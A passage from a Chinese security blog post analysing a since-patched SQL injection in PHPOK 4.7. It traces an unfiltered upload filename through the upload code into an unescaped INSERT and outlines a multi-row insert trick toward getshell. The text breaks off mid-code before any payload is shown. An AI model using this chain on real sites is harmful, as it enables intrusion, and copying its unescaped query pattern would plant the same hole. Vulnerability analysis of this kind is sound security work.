<!DOCTYPE html>
<html lang=zh>
<head><meta name="generator" content="Hexo 3.8.0">
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
    <meta name="description" content="简介phpok是一款PHP开发的开源企业网站系统。在phpok 4.7版本及以前，存在一个由注入导致的前台getshell漏洞。目前官方最新版已经修补。 漏洞分析在/framework/www/upload_control.php中第61行: 1234567891011121314151617181920212223242526272829303132private function upload">
<meta property="og:type" content="article">
<meta property="og:title" content="PHPOK 4.7从注入到getshell">
<meta property="og:url" content="http://allblue147.github.io/2019/12/07/PHPOK 4.7从注入到getshell/index.html">
<meta property="og:site_name" content="A1LB1ue">
<meta property="og:description" content="简介phpok是一款PHP开发的开源企业网站系统。在phpok 4.7版本及以前，存在一个由注入导致的前台getshell漏洞。目前官方最新版已经修补。 漏洞分析在/framework/www/upload_control.php中第61行: 1234567891011121314151617181920212223242526272829303132private function upload">
<meta property="og:locale" content="zh-CN">
<meta property="og:updated_time" content="2019-12-06T17:50:17.318Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="PHPOK 4.7从注入到getshell">
<meta name="twitter:description" content="简介phpok是一款PHP开发的开源企业网站系统。在phpok 4.7版本及以前，存在一个由注入导致的前台getshell漏洞。目前官方最新版已经修补。 漏洞分析在/framework/www/upload_control.php中第61行: 1234567891011121314151617181920212223242526272829303132private function upload">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>PHPOK 4.7从注入到getshell</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" "top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/projects_url">项目</a></li>
        
      </ul>
    </span>
    <br>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="上一篇 " href="/2019/12/07/sql-dnslog/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="下一篇 " href="/2019/12/07/oracle注入/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://allblue147.github.io/2019/12/07/PHPOK 4.7从注入到getshell/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://allblue147.github.io/2019/12/07/PHPOK 4.7从注入到getshell/&text=PHPOK 4.7从注入到getshell"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://allblue147.github.io/2019/12/07/PHPOK 4.7从注入到getshell/&title=PHPOK 4.7从注入到getshell"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://allblue147.github.io/2019/12/07/PHPOK 4.7从注入到getshell/&is_video=false&description=PHPOK 4.7从注入到getshell"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=PHPOK 4.7从注入到getshell&body=Check out this article: http://allblue147.github.io/2019/12/07/PHPOK 4.7从注入到getshell/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://allblue147.github.io/2019/12/07/PHPOK 4.7从注入到getshell/&title=PHPOK 4.7从注入到getshell"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://allblue147.github.io/2019/12/07/PHPOK 4.7从注入到getshell/&title=PHPOK 4.7从注入到getshell"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://allblue147.github.io/2019/12/07/PHPOK 4.7从注入到getshell/&title=PHPOK 4.7从注入到getshell"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://allblue147.github.io/2019/12/07/PHPOK 4.7从注入到getshell/&title=PHPOK 4.7从注入到getshell"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://allblue147.github.io/2019/12/07/PHPOK 4.7从注入到getshell/&name=PHPOK 4.7从注入到getshell&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://allblue147.github.io/2019/12/07/PHPOK 4.7从注入到getshell/&t=PHPOK 4.7从注入到getshell"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#简介"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞分析"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#结语"><span class="toc-number">3.</span> <span class="toc-text">结语</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        PHPOK 4.7从注入到getshell
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">JYP</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2019-12-06T17:03:10.427Z" itemprop="datePublished">2019-12-07</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/笔记/">笔记</a>
    </div>


      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>phpok是一款PHP开发的开源企业网站系统。<br>在phpok 4.7版本及以前，存在一个由注入导致的前台getshell漏洞。<br>目前官方最新版已经修补。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在/framework/www/upload_control.php中第61行:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">private function upload_base($input_name=&apos;upfile&apos;,$cateid=0)</span><br><span class="line">    &#123;</span><br><span class="line">        $rs = $this-&gt;lib(&apos;upload&apos;)-&gt;getfile($input_name,$cateid);</span><br><span class="line">        if($rs[&quot;status&quot;] != &quot;ok&quot;)&#123;</span><br><span class="line">            return $rs;</span><br><span class="line">        &#125;</span><br><span class="line">        $array = array();</span><br><span class="line">        $array[&quot;cate_id&quot;] = $rs[&apos;cate&apos;][&apos;id&apos;];</span><br><span class="line">        $array[&quot;folder&quot;] = $rs[&apos;folder&apos;];</span><br><span class="line">        $array[&quot;name&quot;] = basename($rs[&apos;filename&apos;]);</span><br><span class="line">        $array[&quot;ext&quot;] = $rs[&apos;ext&apos;];</span><br><span class="line">        $array[&quot;filename&quot;] = $rs[&apos;filename&apos;];</span><br><span class="line">        $array[&quot;addtime&quot;] = $this-&gt;time;</span><br><span class="line">        $array[&quot;title&quot;] = $rs[&apos;title&apos;];</span><br><span class="line">        $array[&apos;session_id&apos;] = $this-&gt;session-&gt;sessid();</span><br><span class="line">        $array[&apos;user_id&apos;] = $this-&gt;session-&gt;val(&apos;user_id&apos;);</span><br><span class="line">        $arraylist = array(&quot;jpg&quot;,&quot;gif&quot;,&quot;png&quot;,&quot;jpeg&quot;);</span><br><span class="line">        if(in_array($rs[&quot;ext&quot;],$arraylist))&#123;</span><br><span class="line">            $img_ext = getimagesize($this-&gt;dir_root.$rs[&apos;filename&apos;]);</span><br><span class="line">            $my_ext = array(&quot;width&quot;=&gt;$img_ext[0],&quot;height&quot;=&gt;$img_ext[1]);</span><br><span class="line">            $array[&quot;attr&quot;] = serialize($my_ext);</span><br><span class="line">        &#125;</span><br><span class="line">        $id = $this-&gt;model(&apos;res&apos;)-&gt;save($array);</span><br><span class="line">        if(!$id)&#123;</span><br><span class="line">            $this-&gt;lib(&apos;file&apos;)-&gt;rm($this-&gt;dir_root.$rs[&apos;filename&apos;]);</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;P_Lang(&apos;图片存储失败&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;model(&apos;res&apos;)-&gt;gd_update($id);</span><br><span class="line">        $rs = $this-&gt;model(&apos;res&apos;)-&gt;get_one($id);</span><br><span class="line">        $rs[&quot;status&quot;] = &quot;ok&quot;;</span><br><span class="line">        return $rs;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这是一个文件上传函数，然后在该函数开头又调用了getfile函数，跟进:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public function getfile($input=&apos;upfile&apos;,$cateid=0)</span><br><span class="line">    &#123;</span><br><span class="line">        if(!$input)&#123;</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;content&apos;=&gt;P_Lang(&apos;未指定表单名称&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;_cate($cateid);</span><br><span class="line">        if(isset($_FILES[$input]))&#123;</span><br><span class="line">            $rs = $this-&gt;_upload($input);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $rs = $this-&gt;_save($input);</span><br><span class="line">        &#125;</span><br><span class="line">        if($rs[&apos;status&apos;] != &apos;ok&apos;)&#123;</span><br><span class="line">            return $rs;</span><br><span class="line">        &#125;</span><br><span class="line">        $rs[&apos;cate&apos;] = $this-&gt;cate;</span><br><span class="line">        return $rs;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>如果存在上传文件就调用_upload函数，继续跟进:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">private function _upload($input)</span><br><span class="line">    &#123;</span><br><span class="line">        global $app;</span><br><span class="line">        $basename = substr(md5(time().uniqid()),9,16);</span><br><span class="line">        $chunk = $app-&gt;get(&apos;chunk&apos;,&apos;int&apos;);</span><br><span class="line">        $chunks = $app-&gt;get(&apos;chunks&apos;,&apos;int&apos;);</span><br><span class="line">        if(!$chunks)&#123;</span><br><span class="line">            $chunks = 1;</span><br><span class="line">        &#125;</span><br><span class="line">        $tmpname = $_FILES[$input][&quot;name&quot;];</span><br><span class="line">        $tmpid = &apos;u_&apos;.md5($tmpname);</span><br><span class="line">        $ext = $this-&gt;file_ext($tmpname);</span><br><span class="line">        $out_tmpfile = $this-&gt;dir_root.&apos;data/cache/&apos;.$tmpid.&apos;_&apos;.$chunk;</span><br><span class="line">        if (!$out = @fopen($out_tmpfile.&quot;.parttmp&quot;, &quot;wb&quot;)) &#123;</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;P_Lang(&apos;无法打开输出流&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        $error_id = $_FILES[$input][&apos;error&apos;] ? $_FILES[$input][&apos;error&apos;] : 0;</span><br><span class="line">        if($error_id)&#123;</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;$this-&gt;up_error[$error_id]);</span><br><span class="line">        &#125;</span><br><span class="line">        if(!is_uploaded_file($_FILES[$input][&apos;tmp_name&apos;]))&#123;</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;P_Lang(&apos;上传失败，临时文件无法写入&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        if(!$in = @fopen($_FILES[$input][&quot;tmp_name&quot;], &quot;rb&quot;)) &#123;</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;P_Lang(&apos;无法打开输入流&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        while ($buff = fread($in, 4096)) &#123;</span><br><span class="line">            fwrite($out, $buff);</span><br><span class="line">        &#125;</span><br><span class="line">        @fclose($out);</span><br><span class="line">        @fclose($in);</span><br><span class="line">        $app-&gt;lib(&apos;file&apos;)-&gt;mv($out_tmpfile.&apos;.parttmp&apos;,$out_tmpfile.&apos;.part&apos;);</span><br><span class="line">        $index = 0;</span><br><span class="line">        $done = true;</span><br><span class="line">        for($index=0;$index&lt;$chunks;$index++) &#123;</span><br><span class="line">            if (!file_exists($this-&gt;dir_root.&apos;data/cache/&apos;.$tmpid.&apos;_&apos;.$index.&quot;.part&quot;) ) &#123;</span><br><span class="line">                $done = false;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if(!$done)&#123;</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;&apos;上传的文件异常&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">        $outfile = $this-&gt;folder.$basename.&apos;.&apos;.$ext;</span><br><span class="line">        if(!$out = @fopen($this-&gt;dir_root.$outfile,&quot;wb&quot;)) &#123;</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;P_Lang(&apos;无法打开输出流&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        if(flock($out,LOCK_EX))&#123;</span><br><span class="line">            for($index=0;$index&lt;$chunks;$index++) &#123;</span><br><span class="line">                if (!$in = @fopen($this-&gt;dir_root.&apos;data/cache/&apos;.$tmpid.&apos;_&apos;.$index.&apos;.part&apos;,&apos;rb&apos;))&#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">                while ($buff = fread($in, 4096)) &#123;</span><br><span class="line">                    fwrite($out, $buff);</span><br><span class="line">                &#125;</span><br><span class="line">                @fclose($in);</span><br><span class="line">                $GLOBALS[&apos;app&apos;]-&gt;lib(&apos;file&apos;)-&gt;rm($this-&gt;dir_root.&apos;data/cache/&apos;.$tmpid.&quot;_&quot;.$index.&quot;.part&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            flock($out,LOCK_UN);</span><br><span class="line">        &#125;</span><br><span class="line">        @fclose($out);</span><br><span class="line">        $tmpname = $GLOBALS[&apos;app&apos;]-&gt;lib(&apos;string&apos;)-&gt;to_utf8($tmpname);</span><br><span class="line">        $title = str_replace(&quot;.&quot;.$ext,&apos;&apos;,$tmpname);</span><br><span class="line">        return array(&apos;title&apos;=&gt;$title,&apos;ext&apos;=&gt;$ext,&apos;filename&apos;=&gt;$outfile,&apos;folder&apos;=&gt;$this-&gt;folder,&apos;status&apos;=&gt;&apos;ok&apos;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>其中<strong>$ext = $this-&gt;file_ext($tmpname);</strong>是检测文件后缀的，看一下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">private function file_ext($tmpname)</span><br><span class="line">    &#123;</span><br><span class="line">        $ext = pathinfo($tmpname,PATHINFO_EXTENSION);</span><br><span class="line">        if(!$ext)&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        $ext = strtolower($ext);</span><br><span class="line">        $filetypes = &quot;jpg,gif,png&quot;;</span><br><span class="line">        if($this-&gt;cate &amp;&amp; $this-&gt;cate[&apos;filetypes&apos;])&#123;</span><br><span class="line">            $filetypes .= &quot;,&quot;.$this-&gt;cate[&apos;filetypes&apos;];</span><br><span class="line">        &#125;</span><br><span class="line">        if($this-&gt;file_type)&#123;</span><br><span class="line">            $filetypes .= &quot;,&quot;.$this-&gt;file_type;</span><br><span class="line">        &#125;</span><br><span class="line">        $list = explode(&quot;,&quot;,$filetypes);</span><br><span class="line">        $list = array_unique($list);</span><br><span class="line">        if(!in_array($ext,$list))&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        return $ext;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>上传是比较严格的，只允许上传后缀是jpg,png,gif这种图片后缀的文件，上传我们无法绕过，但是程序对于上传的文件名没有充份的过滤，在函数末尾，将文件名添加到了返回的数组中:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$tmpname = $GLOBALS[&apos;app&apos;]-&gt;lib(&apos;string&apos;)-&gt;to_utf8($tmpname);</span><br><span class="line">        $title = str_replace(&quot;.&quot;.$ext,&apos;&apos;,$tmpname);</span><br><span class="line">        return array(&apos;title&apos;=&gt;$title,&apos;ext&apos;=&gt;$ext,&apos;filename&apos;=&gt;$outfile,&apos;folder&apos;=&gt;$this-&gt;folder,&apos;status&apos;=&gt;&apos;ok&apos;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这里的$tmpname就是我们上传的文件名，注意，不是上传后的文件名，而是上传前的文件名，并且没有对该文件名过滤，然后返回。</p>
<p>我们回到开头，upload_base函数中去:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$rs = $this-&gt;lib(&apos;upload&apos;)-&gt;getfile($input_name,$cateid);</span><br><span class="line">        if($rs[&quot;status&quot;] != &quot;ok&quot;)&#123;</span><br><span class="line">            return $rs;</span><br><span class="line">        &#125;</span><br><span class="line">        $array = array();</span><br><span class="line">        $array[&quot;cate_id&quot;] = $rs[&apos;cate&apos;][&apos;id&apos;];</span><br><span class="line">        $array[&quot;folder&quot;] = $rs[&apos;folder&apos;];</span><br><span class="line">        $array[&quot;name&quot;] = basename($rs[&apos;filename&apos;]);</span><br><span class="line">        $array[&quot;ext&quot;] = $rs[&apos;ext&apos;];</span><br><span class="line">        $array[&quot;filename&quot;] = $rs[&apos;filename&apos;];</span><br><span class="line">        $array[&quot;addtime&quot;] = $this-&gt;time;</span><br><span class="line">        $array[&quot;title&quot;] = $rs[&apos;title&apos;];</span><br><span class="line">        $array[&apos;session_id&apos;] = $this-&gt;session-&gt;sessid();</span><br><span class="line">        $array[&apos;user_id&apos;] = $this-&gt;session-&gt;val(&apos;user_id&apos;);</span><br><span class="line">        $arraylist = array(&quot;jpg&quot;,&quot;gif&quot;,&quot;png&quot;,&quot;jpeg&quot;);</span><br><span class="line">        if(in_array($rs[&quot;ext&quot;],$arraylist))&#123;</span><br><span class="line">            $img_ext = getimagesize($this-&gt;dir_root.$rs[&apos;filename&apos;]);</span><br><span class="line">            $my_ext = array(&quot;width&quot;=&gt;$img_ext[0],&quot;height&quot;=&gt;$img_ext[1]);</span><br><span class="line">            $array[&quot;attr&quot;] = serialize($my_ext);</span><br><span class="line">        &#125;</span><br><span class="line">        $id = $this-&gt;model(&apos;res&apos;)-&gt;save($array);</span><br></pre></td></tr></table></figure>
<p>可以看到这里将返回值中的title的值赋值给了$array[‘title’],这个值是我们可控的，然后将$array带入到了save函数中，我们看一下该函数:</p>
<p>在/framework/model/res.php中第279行:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public function save($data,$id=0)</span><br><span class="line">    &#123;</span><br><span class="line">        if(!$data || !is_array($data))&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        if($id)&#123;</span><br><span class="line">            return $this-&gt;db-&gt;update_array($data,&quot;res&quot;,array(&quot;id&quot;=&gt;$id));</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return $this-&gt;db-&gt;insert_array($data,&quot;res&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>将$data带入到了insert_array函数中，我们看一下该函数:</p>
<p>/framework/engine/db/mysqli.php中第211行:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">public function insert_array($data,$tbl,$type=&quot;insert&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        if(!$tbl || !$data || !is_array($data))&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        if(substr($tbl,0,strlen($this-&gt;prefix)) != $this-&gt;prefix)&#123;</span><br><span class="line">            $tbl = $this-&gt;prefix.$tbl;</span><br><span class="line">        &#125;</span><br><span class="line">        $type = strtolower($type);</span><br><span class="line">        $sql = $type == &apos;insert&apos; ? &quot;INSERT&quot; : &quot;REPLACE&quot;;</span><br><span class="line">        $sql.= &quot; INTO &quot;.$tbl.&quot; &quot;;</span><br><span class="line">        $sql_fields = array();</span><br><span class="line">        $sql_val = array();</span><br><span class="line">        foreach($data AS $key=&gt;$value)&#123;</span><br><span class="line">            $sql_fields[] = &quot;`&quot;.$key.&quot;`&quot;;</span><br><span class="line">            $sql_val[] = &quot;&apos;&quot;.$value.&quot;&apos;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        $sql.= &quot;(&quot;.(implode(&quot;,&quot;,$sql_fields)).&quot;) VALUES(&quot;.(implode(&quot;,&quot;,$sql_val)).&quot;)&quot;;</span><br><span class="line">        return $this-&gt;insert($sql);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>就是将该数组中的键值遍历出来，将键作为字段名，将值作为对应字段的值。可以看到，对于值是没有进行转义的，其中包括我们可以控制的title的值，那么这里就产生了一个insert的注入。那么这个注入我们有什么用呢？当然首先想到的是一个出数据，但是对于update 或者insert注入，一般来说我会想办法将这个注入升级一下危害。注意这个注入是一个insert注入，并且insert语句是可以一次插入多条内容的，我们不能控制当前这条insert语句的内容，我们可以控制下一条的内容，比如说像这样:<br>Insert into file values(1,2,3,),(4,5,6)<br>那么我们控制下一条的内容有什么用，好，现在我们开始看/framework/www/upload_control.php中的第103行:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">public function replace_f()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;popedom();</span><br><span class="line">        $id = $this-&gt;get(&quot;oldid&quot;,&apos;int&apos;);</span><br><span class="line">        if(!$id)&#123;</span><br><span class="line">            $this-&gt;json(P_Lang(&apos;没有指定要替换的附件&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        $old_rs = $this-&gt;model(&apos;res&apos;)-&gt;get_one($id);</span><br><span class="line">        if(!$old_rs)&#123;</span><br><span class="line">            $this-&gt;json(P_Lang(&apos;资源不存在&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        $rs = $this-&gt;lib(&apos;upload&apos;)-&gt;upload(&apos;upfile&apos;);</span><br><span class="line">        if($rs[&quot;status&quot;] != &quot;ok&quot;)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;json(P_Lang(&apos;附件上传失败&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        $arraylist = array(&quot;jpg&quot;,&quot;gif&quot;,&quot;png&quot;,&quot;jpeg&quot;);</span><br><span class="line">        $my_ext = array();</span><br><span class="line">        if(in_array($rs[&quot;ext&quot;],$arraylist))</span><br><span class="line">        &#123;</span><br><span class="line">            $img_ext = getimagesize($rs[&quot;filename&quot;]);</span><br><span class="line">            $my_ext[&quot;width&quot;] = $img_ext[0];</span><br><span 